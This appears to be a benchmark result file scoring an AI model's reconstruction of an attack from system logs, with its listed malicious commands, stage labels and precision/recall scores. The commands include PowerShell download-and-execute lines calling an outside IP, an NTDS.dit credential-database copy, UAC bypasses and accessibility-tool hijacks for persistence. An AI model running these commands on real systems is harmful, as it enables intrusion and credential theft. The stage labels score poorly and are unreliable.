@@ -1,0 +1,144 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u260f'\u261d\u2105\u2116B.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "esentutl.exe  /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\" ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Set-ItemProperty -Path \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "\"C:\\Windows\\System32\\fodhelper.exe\" ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": " powershell.exe -ExecutionPolicy Bypass -C \"$input_table = \\\"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\\\".Split(\",\") Foreach ($item in $input_table){$item = $item.Trim() $registryPath = \\\"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\\\" IF(!(Test-Path $registryPath)) { New-Item -Path $registryPath -Force New-ItemProperty -Path $registryPath -Name Debugger -V \"C:\\windows\\system32\\cmd.exe\" } }\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119 \"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "Registry add \"HKLCU\\Environment\" /v \"windir\" /d \"cmd /c start powershell&REM \"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": " schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1547.001 -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \\\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\\" /v \\\"verifierdlls \\\" /d \\\"1 \\\" /f\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \\\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\\" /v \\\"verifierdlls\\\" /f\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup\"",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The system was attacked through various means such as exploiting PowerShell and executing malicious scripts, utilizing Windows Management Instrumentation (WMI), modifying registry settings, using Windows Remote Management (WinRM), and more.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 79619,
+      "completion_tokens": 5914,
+      "total_tokens": 85533,
+      "wall_clock_s": 194.386,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.30434782608695654,
+      "recall": 0.4117647058823529,
+      "f1": 0.35,
+      "tp": 7,
+      "fp": 16,
+      "fn": 10
+    },
+    "stage": {
+      "precision": 0.08695652173913043,
+      "recall": 0.14285714285714285,
+      "f1": 0.1081081081081081,
+      "tp": 2,
+      "fp": 21,
+      "fn": 12,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.05555555555555555,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 79619,
+      "completion_tokens": 5914,
+      "total_tokens": 85533,
+      "wall_clock_s": 194.386,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
